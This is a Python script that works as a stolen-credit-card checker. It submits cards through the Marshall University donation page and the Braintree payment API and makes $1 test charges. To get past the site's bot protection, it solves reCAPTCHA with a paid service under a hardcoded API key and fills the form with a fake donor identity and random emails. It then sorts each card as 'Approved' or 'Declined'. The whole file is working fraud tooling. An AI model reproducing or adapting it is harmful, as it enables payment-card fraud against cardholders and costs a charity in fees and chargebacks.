import base64
import random
import string
import capsolver
import asyncio
from httpx import AsyncClient


def random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    domains = ['@gmail.com', '@hotmail.com']
    return name + random.choice(domains)

async def b3ccn1(cc, mes, ano, cvv,proxyg):
    email = random_email()
    
    web = AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None)
    
    capsolver.api_key = "CAP-5D246BDACA192D1EAC3F1494BE61BA77"
            
    g_response = (await asyncio.to_thread(lambda: capsolver.solve({
    "type": "ReCaptchaV3TaskProxyLess",
    "websiteKey": '6LeyvPIhAAAAABH3qiwoDrsBuV7mUJxxnOF4kg8g',
    "websiteURL": 'https://give.marshall.edu/',
    })))['gRecaptchaResponse']

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.1.41640452.1733112044; sfss_=839120360490968f0835b4148a08ea394a0432a0gAJ9cQAoWAMAAABfaWRxAVggAAAANjYzZTI2YzljNTYyNDFjOGIwNDRkNGNmYmFjZDAyMWZxAlgOAAAAX2NyZWF0aW9uX3RpbWVxA0dB2dNMOqy4IVgOAAAAX2FjY2Vzc2VkX3RpbWVxBEdB2dNMfzPZtFgIAAAAX2V4cGlyZXNxBWNkYXRldGltZQpkYXRldGltZQpxBmNfY29kZWNzCmVuY29kZQpxB1gMAAAAB8OpAwwEAC8ED8OQcQhYBgAAAGxhdGluMXEJhnEKUnELhXEMUnENdS4=; _ga_M0Z6C2W850=GS1.1.1733112044.1.1.1733112343.0.0.0; _ga_4WGDXMXYNH=GS1.1.1733112044.1.1.1733112347.0.0.0; _ga_M9ERYNX6TS=GS1.1.1733112044.1.1.1733112347.0.0.0',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjcwODE3NSIsImFwIjoiMTEyMDA0NzE5NiIsImlkIjoiMGE2ZjU1MzdkMTQwZDBkYyIsInRyIjoiY2VmOTMyMGUyNDZjYzdjY2Q4OWNiNTQ0NDg2NTU2ZWEiLCJ0aSI6MTczMzExMjM0NzA1MX19',
        'origin': 'https://give.marshall.edu',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://give.marshall.edu/project/26398/donate',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'lineitem-0Drecurring_type': 'one_time',
        'lineitem-0Drecurring_gift_fixed_frequency': 'monthly',
        'lineitem-0Drecurring_gift_fixed_duration': '12',
        'lineitem-0Damount': '1.00',
        'lineitem-0Dproject': '26398',
        'lineitem-0Ddesignation': '153035',
        'lineitem-0Dother_designation_name': '',
        'email': email,
        'first_name': 'Sebastian',
        'last_name': 'Gutierrez',
        'company_name': 'Hunter',
        'phone': '15059947000',
        'country': 'US',
        'address': '103-105 Central Ave',
        'address2': '',
        'city': 'Orange',
        'state': 'NJ',
        'zipcode': '07050-3824',
        'comments': '2nsk2',
        '10016': '',
        'in_memorium': 'in-none',
        'in_memorium_name': '',
        'honoree_email': '',
        'anon_don': '1',
        'proj_id': '26398',
        'ga4_cid': '41640452.1733112044',
        'device_type': 'Mobile',
        'ga_recaptcha': g_response,
        'payment_type': 'web',
        'group_set_id': 'undefined',
    }

    req1 = await web.post('https://give.marshall.edu/prep-donation', headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga=GA1.1.41640452.1733112044; sfss_=839120360490968f0835b4148a08ea394a0432a0gAJ9cQAoWAMAAABfaWRxAVggAAAANjYzZTI2YzljNTYyNDFjOGIwNDRkNGNmYmFjZDAyMWZxAlgOAAAAX2NyZWF0aW9uX3RpbWVxA0dB2dNMOqy4IVgOAAAAX2FjY2Vzc2VkX3RpbWVxBEdB2dNMfzPZtFgIAAAAX2V4cGlyZXNxBWNkYXRldGltZQpkYXRldGltZQpxBmNfY29kZWNzCmVuY29kZQpxB1gMAAAAB8OpAwwEAC8ED8OQcQhYBgAAAGxhdGluMXEJhnEKUnELhXEMUnENdS4=; _ga_4WGDXMXYNH=GS1.1.1733112044.1.1.1733112347.0.0.0; _ga_M0Z6C2W850=GS1.1.1733112044.1.1.1733112347.0.0.0; _ga_M9ERYNX6TS=GS1.1.1733112044.1.1.1733112347.0.0.0',
        'origin': 'https://give.marshall.edu',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://give.marshall.edu/project/26398/donate',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    data = {
        'order_id': '38794a4b687a6672574a4653',
        'merchant_account_id': 'themarshalluniversityfoundationinc_instant',
        'amount': '1.00',
        'cancel_url': 'https://give.marshall.edu/project/26398/donate?don_msg=cancel&utm_nooverride=1',
        'thanks_url': 'https://give.marshall.edu/project/26398/thanks?atid=5369634&utm_nooverride=1',
        'order_description': 'Annual Giving',
        'first_name': 'Sebastian',
        'last_name': 'Gutierrez',
        'street_address': '103-105 Central Ave',
        'extended_address': '',
        'email': email,
        'phone': '15059947000',
        'locality': 'Orange',
        'region': 'NJ',
        'postal_code': '07050-3824',
        'country_code_alpha2': 'US',
        'line_items': '5.00,100101',
        'enable_venmo': 'true',
        'enable_paypal': 'true',
        'Merchant_id': '34c8xwkwxyy7rbcd',
        'x_amount': '1.00',
        'ip_address': '2806:1016:8:baa3:4976:c7c3:6269:89c8',
        'module_id': '26398',
        'module_type': 'projects',
        'sf_trans_id': '5369634',
        'sf_payment_type': 'donation',
        'sf_don_id': '38794a4b687a6672574a4653',
        'sf_amount': '1.00',
        'sf_sys_code': 'bt',
    }

    req2 = await web.post('https://give.marshall.edu/pmt/braintree', headers=headers, data=data)
    
    authorization = req2.text.split('braintree.client.create({')[1].split('authorization: "')[1].split('"')[0]
    decodeclient = base64.b64decode(authorization).decode('utf-8')

    fingerprint = decodeclient.split('"authorizationFingerprint":"')[1].split('"')[0]

    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'authorization': 'Bearer ' + fingerprint,
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://give.marshall.edu',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://give.marshall.edu/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '69f16845-a9ab-439d-949e-2b9dc0993b88',
        },
        'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
        'operationName': 'ClientConfiguration',
    }

    req3 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'authorization': 'Bearer ' + fingerprint,
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '69f16845-a9ab-439d-949e-2b9dc0993b88',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    #'cvv': '000',
                    'billingAddress': {
                        'postalCode': '10010',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    req4 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tokencc = req4.json()['data']['tokenizeCreditCard']['token']

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.1.41640452.1733112044; sfss_=839120360490968f0835b4148a08ea394a0432a0gAJ9cQAoWAMAAABfaWRxAVggAAAANjYzZTI2YzljNTYyNDFjOGIwNDRkNGNmYmFjZDAyMWZxAlgOAAAAX2NyZWF0aW9uX3RpbWVxA0dB2dNMOqy4IVgOAAAAX2FjY2Vzc2VkX3RpbWVxBEdB2dNMfzPZtFgIAAAAX2V4cGlyZXNxBWNkYXRldGltZQpkYXRldGltZQpxBmNfY29kZWNzCmVuY29kZQpxB1gMAAAAB8OpAwwEAC8ED8OQcQhYBgAAAGxhdGluMXEJhnEKUnELhXEMUnENdS4=; _ga_4WGDXMXYNH=GS1.1.1733112044.1.1.1733112347.0.0.0; _ga_M0Z6C2W850=GS1.1.1733112044.1.1.1733112347.0.0.0; _ga_M9ERYNX6TS=GS1.1.1733112044.1.1.1733112347.0.0.0',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjcwODE3NSIsImFwIjoiMTEyMDA0NzE5NiIsImlkIjoiYzI3M2I2YzkzNzc0ZmJlYyIsInRyIjoiNzJhM2Q5ZjdkOWQzYjAwODkzNTg0ZjEyMGNhNTNhMzgiLCJ0aSI6MTczMzExMzA5ODU2Nn19',
        'origin': 'https://give.marshall.edu',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://give.marshall.edu/pmt/braintree',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    data = {
        'order_id': '38794a4b687a6672574a4653',
        'merchant_account_id': 'themarshalluniversityfoundationinc_instant',
        'amount': '1.00',
        'cancel_url': 'https://give.marshall.edu/project/26398/donate?don_msg=cancel&amp;utm_nooverride=1',
        'thanks_url': 'https://give.marshall.edu/project/26398/thanks?atid=5369634&amp;utm_nooverride=1',
        'order_description': 'Annual Giving',
        'first_name': 'Sebastian',
        'last_name': 'Gutierrez',
        'street_address': '103-105 Central Ave',
        'extended_address': '',
        'email': email,
        'phone': '15059947000',
        'locality': 'Orange',
        'region': 'NJ',
        'postal_code': '07050-3824',
        'country_code_alpha2': 'US',
        'line_items': '5.00,100101',
        'enable_venmo': 'true',
        'enable_paypal': 'true',
        'Merchant_id': '34c8xwkwxyy7rbcd',
        'x_amount': '1.00',
        'ip_address': '2806:1016:8:baa3:4976:c7c3:6269:89c8',
        'module_id': '26398',
        'module_type': 'projects',
        'sf_trans_id': '5369634',
        'sf_payment_type': 'donation',
        'sf_don_id': '38794a4b687a6672574a4653',
        'sf_amount': '1.00',
        'sf_sys_code': 'bt',
        'nonce': tokencc,
        'device_data': '{"device_session_id":"9f880f852e6c7234ebcecff8c44b2075","fraud_merchant_id":null,"correlation_id":"13987e6c9ee96a8bdf2aa28ddabc8c6a"}',
        'ga_recaptcha': g_response,
    }

    req5 = await web.post('https://give.marshall.edu/pmt/braintree_transaction', headers=headers, data=data)
    print(req5.text)
    if '"is_success": true' in req5.text:
        status = "Approved ✅"
        mensaje = "Charged 1$"
    else:
        mensaje = req5.json()['processor_response']
        if "avs" in mensaje or "Funds" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"
    
    await web.aclose()
    return status, mensaje
